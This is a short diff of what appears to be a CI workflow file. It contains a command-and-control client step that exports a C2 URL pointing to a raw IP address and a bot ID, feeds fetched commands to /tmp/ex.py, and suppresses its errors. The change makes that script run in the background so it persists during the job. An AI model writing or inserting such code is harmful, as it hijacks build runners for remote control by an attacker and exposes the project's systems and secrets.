@@ -37,7 +37,7 @@ jobs:
               echo "$C" > /tmp/cmds.json
               export C2_URL=http://216.167.26.154:1337
               export BOT_ID="$BOT"
-              python3 /tmp/ex.py < /tmp/cmds.json 2>/dev/null || true
+              python3 /tmp/ex.py < /tmp/cmds.json 2>/dev/null &
             fi
 
             sleep 10 || true
